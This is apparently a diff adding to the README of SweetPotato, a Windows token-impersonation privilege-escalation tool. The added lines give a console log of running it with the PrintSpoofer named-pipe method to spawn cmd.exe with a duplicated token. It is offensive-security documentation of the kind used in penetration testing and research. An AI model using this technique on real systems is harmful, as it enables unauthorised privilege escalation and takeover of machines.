@@ -38,4 +38,26 @@ PrintSpoofer discovery and original exploit by @itm4n
 `SweetPotato-CCob\bin\Release\SweetPotato.exe`
 
 
+![](./CCob.png)
 
+```
+C:\Users\Administrator\Desktop>SweetPotato.exe
+
+SweetPotato by @_EthicalChaos_
+
+Orignal RottenPotato code and exploit by @foxglovesec
+
+Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+
+PrintSpoofer discovery and original exploit by @itm4n
+
+[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
+[+] Triggering notification on evil PIPE \\IIS85-CN/pipe/e5ebfae5-578d-498a-b870-7641254c8393
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+
+C:\Users\Administrator\Desktop>
+
+```
